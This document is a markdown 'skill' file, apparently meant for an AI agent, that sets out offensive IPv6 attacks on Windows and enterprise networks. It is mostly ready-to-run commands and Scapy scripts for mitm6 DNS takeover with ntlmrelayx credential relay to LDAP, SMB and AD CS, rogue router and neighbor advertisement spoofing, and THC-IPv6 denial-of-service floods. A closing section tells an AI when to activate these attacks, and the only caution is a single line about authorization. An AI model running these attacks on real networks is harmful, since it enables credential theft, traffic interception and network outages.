# IPv6 Attacks Skill

## Goal

Exploit IPv6 network misconfigurations and attack vectors to gain unauthorized access, perform man-in-the-middle attacks, and bypass IPv4-only security controls.

## Methodology

1. **IPv6 Reconnaissance**: Discover IPv6-enabled hosts and services
2. **Router Advertisement Attacks**: Inject rogue RA messages for MITM
3. **DHCPv6 Attacks**: Exploit DHCPv6 for DNS hijacking
4. **IPv6 Address Spoofing**: Impersonate IPv6 addresses
5. **Dual-Stack Attacks**: Exploit IPv4/IPv6 transition mechanisms

## Background

Many networks have IPv6 enabled by default but lack proper security controls:
- Windows prefers IPv6 over IPv4 by default
- IPv6 autoconfiguration (SLAAC) is enabled by default
- RA Guard and DHCPv6 Guard often not implemented
- Security tools may not monitor IPv6 traffic

## Tools

* **mitm6**: DHCPv6 spoofing and DNS takeover
* **THC-IPv6**: IPv6 attack toolkit
* **Scapy**: Craft custom IPv6 packets
* **nmap**: IPv6 scanning
* **Responder**: LLMNR/NBT-NS/mDNS poisoning (works with IPv6)

## Example Commands

```bash
# mitm6 - IPv6 DNS takeover for NTLM relay
mitm6 -d domain.local

# mitm6 with ntlmrelayx
# Terminal 1:
mitm6 -d domain.local

# Terminal 2:
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh fakewpad.domain.local -l loot

# IPv6 host discovery
nmap -6 -sn fe80::/64 --script=targets-ipv6-multicast-*

# IPv6 port scan
nmap -6 -sV -p- fe80::1%eth0

# Ping all-nodes multicast address
ping6 -I eth0 ff02::1

# Ping all-routers multicast address  
ping6 -I eth0 ff02::2

# Discover IPv6 neighbors
ip -6 neigh show

# THC-IPv6 alive discovery
alive6 eth0

# THC-IPv6 router advertisement attack
fake_router6 eth0 2001:db8::1/64

# THC-IPv6 flood attack
flood_router6 eth0
```

## Router Advertisement Attack

```python
#!/usr/bin/env python3
# Rogue Router Advertisement with Scapy
from scapy.all import *

# Create rogue RA
ra = IPv6(dst="ff02::1")/\
     ICMPv6ND_RA(routerlifetime=1800)/\
     ICMPv6NDOptSrcLLAddr(lladdr="aa:bb:cc:dd:ee:ff")/\
     ICMPv6NDOptPrefixInfo(prefix="2001:db8:dead:beef::", prefixlen=64)/\
     ICMPv6NDOptRDNSS(dns=["2001:db8::53"], lifetime=1800)

# Send continuously
sendp(Ether(dst="33:33:00:00:00:01")/ra, iface="eth0", loop=1, inter=5)
```

## DHCPv6 Attack with mitm6

```bash
# Basic mitm6 attack
mitm6 -d domain.local -i eth0

# Combined with ntlmrelayx for credential capture
# Start ntlmrelayx first
ntlmrelayx.py -6 -t smb://target-server -smb2support

# Then start mitm6
mitm6 -d domain.local

# For LDAP relay (requires LDAP signing disabled)
ntlmrelayx.py -6 -t ldap://dc.domain.local --add-computer

# Relay to AD CS
ntlmrelayx.py -6 -t http://ca-server/certsrv/certfnsh.asp --adcs --template User
```

## IPv6 SLAAC Attack

```bash
# THC-IPv6 SLAAC attack
# Become the default router
fake_router6 eth0 2001:db8::/64

# Then MITM all IPv6 traffic
# Enable forwarding
sysctl -w net.ipv6.conf.all.forwarding=1

# Set up routing to real gateway
ip -6 route add default via fe80::real-router dev eth0
```

## IPv6 Neighbor Discovery Attack

```bash
# Neighbor Advertisement spoofing (like ARP spoofing)
# THC-IPv6
parasite6 eth0

# Or with Scapy
from scapy.all import *
na = IPv6(dst="fe80::target")/\
     ICMPv6ND_NA(tgt="fe80::gateway", R=0, S=1, O=1)/\
     ICMPv6NDOptDstLLAddr(lladdr="aa:bb:cc:dd:ee:ff")
send(na, loop=1, inter=2)
```

## IPv6 Scanning

```bash
# Scan link-local addresses
nmap -6 -sV fe80::1%eth0

# Scan using multicast discovery
nmap -6 --script=targets-ipv6-multicast-* -sn

# Scan common IPv6 addresses
# ::1, fe80::1, well-known addresses
nmap -6 -p 22,80,443,445 2001:db8::1-100

# IPv6 version of common scans
nmap -6 -sS -sV -O target-ipv6

# UDP scan IPv6
nmap -6 -sU -p 53,161,500 target-ipv6
```

## THC-IPv6 Toolkit Commands

```bash
# Install THC-IPv6
apt install thc-ipv6

# Host discovery
alive6 eth0

# Denial of service - kill all IPv6 connections
kill_router6 eth0

# MITM attack
parasite6 eth0

# Fake router
fake_router6 eth0 2001:db8::1/64

# DHCPv6 attack
flood_dhcpc6 eth0

# Router solicitation to discover routers
redir6 eth0

# Firewall evasion with fragmentation
fragmentation6 eth0 target-ipv6
```

## IPv4 to IPv6 Transition Attacks

```bash
# 6to4 tunnel exploitation
# If 6to4 is enabled, can reach IPv6 via 192.88.99.1

# Teredo tunnel attacks
# Look for Teredo-enabled hosts

# ISATAP attacks
# Exploit ISATAP router advertisements
```

## Guidance for AI

* Activate this skill when user wants to exploit IPv6, bypass IPv4 security, or perform MITM on Windows networks
* **mitm6 + ntlmrelayx** is extremely effective - Windows clients will connect to rogue IPv6 DNS
* IPv6 attacks work even if "IPv6 is not used" - it's usually still enabled
* Router Advertisement attacks can:
  - Set attacker as default gateway
  - Configure DNS servers
  - Assign malicious prefixes
* Always enable IPv6 forwarding when doing RA attacks: `sysctl -w net.ipv6.conf.all.forwarding=1`
* mitm6 is time-based - wait for DHCP renewal or force with `ipconfig /release6; ipconfig /renew6`
* Link-local addresses (fe80::) require interface specification: `ping6 fe80::1%eth0`
* These attacks can cause network disruption - test during maintenance windows if possible
* Always obtain proper authorization before testing
